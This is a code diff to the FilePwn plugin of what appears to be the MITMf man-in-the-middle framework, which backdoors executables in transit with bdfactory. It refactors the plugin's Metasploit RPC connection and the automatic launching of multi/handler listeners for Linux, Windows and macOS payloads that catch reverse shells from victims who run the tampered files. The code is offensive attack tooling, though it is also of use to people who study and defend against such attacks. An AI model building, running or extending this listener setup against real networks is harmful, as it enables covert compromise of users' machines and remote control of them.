@@ -68,7 +68,7 @@ import multiprocessing
 from libs.bdfactory import pebin
 from libs.bdfactory import elfbin
 from libs.bdfactory import machobin
-from core.msfrpc import Msfrpc
+from core.msfrpc import Msf
 from core.utils import shutdown
 from plugins.plugin import Plugin
 from tempfile import mkstemp
@@ -126,26 +126,15 @@ class FilePwn(Plugin):
         self.zipblacklist    = self.userConfig['ZIP']['blacklist']
         self.tarblacklist    = self.userConfig['TAR']['blacklist']
 
-        #Metasploit options
-        msfcfg  = self.config['MITMf']['Metasploit']
-        rpcip   = msfcfg['rpcip']
-        rpcpass = msfcfg['rpcpass']
+        msfversion = Msf().version()
+        self.tree_info.append("Connected to Metasploit v{}".format(msfversion))
 
-        try:
-            msf = Msfrpc({"host": rpcip})  #create an instance of msfrpc libarary
-            msf.login('msf', rpcpass)
-            version = msf.call('core.version')['version']
-            self.tree_info.append("Connected to Metasploit v{}".format(version))
-            
-            t = threading.Thread(name='setupMSF', target=self.setupMSF, args=(msf,))
-            t.setDaemon(True)
-            t.start()
-        except Exception:
-            shutdown("[-] Error connecting to MSF! Make sure you started Metasploit and its MSGRPC server")
+        t = threading.Thread(name='setupMSF', target=self.setupMSF)
+        t.setDaemon(True)
+        t.start()
 
-    def setupMSF(self, msf):
-        
-        jobs = msf.call('job.list')
+    def setupMSF(self):
+        msf = Msf()
         for config in [self.LinuxIntelx86, self.LinuxIntelx64, self.WindowsIntelx86, self.WindowsIntelx64, self.MachoIntelx86, self.MachoIntelx64]:
             cmd = "use exploit/multi/handler\n"
             cmd += "set payload {}\n".format(config["MSFPAYLOAD"])
@@ -154,21 +143,16 @@ class FilePwn(Plugin):
             cmd += "set ExitOnSession False\n"
             cmd += "exploit -j\n"
 
-            if jobs:
-                for pid, name in jobs.iteritems():
-                    info = msf.call('job.info', [pid])
-                    if (info['name'] != "Exploit: multi/handler") or (info['datastore']['payload'] != config["MSFPAYLOAD"]) or (info['datastore']['LPORT'] != config["PORT"]) or (info['datastore']['lhost'] != config['HOST']):
-                        #Create a virtual console
-                        c_id = msf.call('console.create')['id']
-
-                        #write the cmd to the newly created console
-                        msf.call('console.write', [c_id, cmd])
+            pid = msf.findpid('multi/handler')
+            if pid:
+                info = msf.jobinfo(pid)
+                if (info['datastore']['payload'] == config["MSFPAYLOAD"]) and (info['datastore']['LPORT'] == config["PORT"]) and (info['datastore']['lhost'] != config['HOST']):
+                    msf.killjob(pid)
+                    msf.sendcommand(cmd)
+                else:
+                    msf.sendcommand(cmd)
             else:
-                #Create a virtual console
-                c_id = msf.call('console.create')['id']
-
-                #write the cmd to the newly created console
-                msf.call('console.write', [c_id, cmd])
+                msf.sendcommand(cmd)
 
     def onConfigChange(self):
         self.initialize(self.options)
